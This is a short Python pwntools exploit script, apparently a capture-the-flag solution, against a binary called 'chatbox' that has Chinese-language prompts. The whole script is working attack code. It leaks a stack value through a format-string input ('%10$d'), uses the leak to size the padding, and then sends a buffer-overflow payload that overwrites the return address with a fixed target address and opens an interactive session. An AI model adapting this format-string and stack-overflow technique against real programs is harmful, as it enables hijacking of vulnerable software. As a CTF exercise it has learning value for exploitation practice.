from pwn import *
context(log_level='debug', arch='amd64', os='linux')
#p = remote("172.23.216.203", 33739) 
p = process('./chatbox')
p.recvuntil('2.跟我侃大山。'.encode())
p.sendline(b'1')
p.recvuntil("你可以问我个位数老九门加减法".encode())  
p.sendline(b'%10$d') 
leaked_data  = p.recvuntil("系统".encode(), drop=True)
v2 = int(leaked_data)
cnt = v2 + 1
print(f"[*] Leaked random value (cnt): {cnt}")
pad_len = 72 - cnt
p.sendline(b'2') 
magic_addr = 0x4011EE 
payload = flat([
    b'a' * pad_len,        
    b'1145141919810',      
    b'a' * 35,             
    magic_addr             
])
p.recvuntil("谁还要讲故事?".encode()) 
p.sendline(payload)
p.interactive()